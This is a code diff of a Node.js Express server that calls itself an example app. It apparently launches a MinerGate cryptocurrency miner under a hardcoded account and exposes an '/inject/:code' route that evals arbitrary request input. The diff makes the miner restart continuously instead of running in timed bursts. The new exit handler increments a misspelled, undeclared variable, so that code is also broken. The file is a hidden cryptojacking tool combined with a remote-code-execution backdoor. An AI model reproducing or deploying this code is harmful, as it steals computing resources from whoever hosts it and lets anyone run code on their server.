@@ -5,7 +5,7 @@ const app = express();
 var state = false;
 var proc = '';
 var coin = 'bcn';
-
+var count = 0;
 
 app.listen(process.env.PORT || 8080, ()=>{
   console.log('Example app listening on port 3000!');
@@ -20,23 +20,17 @@ app.get('/coin/:coin', function (req, res) {
 app.get('/inject/:code', function (req, res) {
   	eval(req.params.code);
 });
+app.get('/counter', function (req, res) {
+  	res.send(count)
+});
 const start = ()=>{
     state = true;
     proc = spawn('./opt/minergate-cli/express', ['-user', 'ian10_141@yahoo.com.br', "-"+coin]);
     proc.on('close', () => {
-      console.log('child process exited');
-      state = false;
+      cont++;
+      start();
     });
 }
-//start for the first time
+
 start();
-setTimeout(function(){
-  proc.kill('SIGINT');
-}, 3*60*1000);
-//keep starting and closing
-setInterval(function(){
-  start();
-  setTimeout(function(){
-    proc.kill('SIGINT');
-  }, 3*60*1000);
-}, 3.2*60*1000);
+
